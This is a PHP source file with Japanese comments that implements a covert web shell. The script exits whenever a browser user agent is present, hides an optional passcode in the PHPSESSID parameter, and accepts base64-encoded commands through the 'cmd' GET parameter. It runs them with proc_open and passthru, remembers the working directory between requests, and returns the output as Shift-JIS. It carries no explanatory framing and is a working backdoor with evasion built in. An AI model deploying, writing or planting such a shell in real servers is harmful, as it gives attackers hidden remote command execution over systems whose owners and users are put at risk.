<?php
// *** ここにパスコードを設定する ***
    define('PASS_CODE', '');
// *** ここにパスコードを設定する ***

    // 言語設定
    mb_language('Japanese');

    // ユーザーエージェントチェック
    if (isset($_SERVER['HTTP_USER_AGENT'])) {
        return;
    }

    if (PASS_CODE != '' && PASS_CODE != $_GET['PHPSESSID']) {
        return;
    }

    // セッションスタート
    session_start();

    // セッションチェック
    if (!isset($_SESSION['SESSION'])) {
        $_SESSION['SESSION'] = 'on';
        $_SESSION['path'] = getcwd();
        return;
    } elseif (isset($_SESSION['path'])) {
        $path = $_SESSION['path'];
        @chdir($path);
    } else {
        $path = getcwd();
    }

    // データがある場合
    if (isset($_GET['cmd'])) {
        $command = str_replace('$', "\n", $_GET['cmd']);
        $command = str_replace('#', '+', $command);
        $command = str_replace('%', '/', $command);
        $command = base64_decode($command);
    } else {
        return;
    }

    // cdコマンドの場合ディレクトリを出力
    if (substr(trim($command), 0, 3) == 'cd ') {
        $temp = trim(substr($command, 3), " \t\n\r");
        // Windowsの場合
        if (PHP_OS == 'WIN32' || PHP_OS == 'WINNT') {
            // 絶対・相対を判別
            if (substr($temp, 1, 1) == ':') {
                @chdir($temp);
            } else {
                @chdir($path . DIRECTORY_SEPARATOR . $temp);
            }
            $_SESSION['path'] = getcwd();
            passthru('cd');
        } else {
            // 絶対・相対を判別
            if (substr($temp, 0, 1) == DIRECTORY_SEPARATOR) {
                @chdir($temp);
            } else {
                @chdir($path . DIRECTORY_SEPARATOR . $temp);
            }
            $_SESSION['path'] = getcwd();
            passthru('pwd');
        }
    } else {
        // プロセスオープン
        $process = proc_open($command, array(
            0 => array('pipe', 'r'),
            1 => array('pipe', 'w'),
            2 => array('pipe', 'w')
            ), $pipes, $path);

        // プロセス起動失敗
        if (!$process) {
            return;
        }

        // コマンド分解
        $temp = explode("\n", $command);
        for ($i = 1; $i < count($temp); $i++){
            fwrite($pipes[0], $temp[$i]);
        }
        fclose($pipes[0]);

        // 固まるの防止
        stream_set_blocking($pipes[1], 0);
        stream_set_blocking($pipes[2], 0);
        set_time_limit(60);

        // パイプが読み出し可能な間
        while (!feof($pipes[1]) || !feof($pipes[2])) {

            $in = array($pipes[1], $pipes[2]);
            $ex = $out = null;
            $result = stream_select($in, $out, $ex, 5);

            // 異常・タイムアウトした場合
            if ($result === false || $result === 0) {
                proc_terminate($process);
                die('コマンドがタイムアウトしました。');
                break;
            } elseif ($result > 0) {
                // データ読み出し
                foreach ($in as $temp) {
                    while (!feof($temp)) {
                        print mb_convert_encoding(fgets($temp), 'SJIS', 'auto');
                    }
                }
            }
        }

        // プロセスクローズ
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($process);
    }
?>
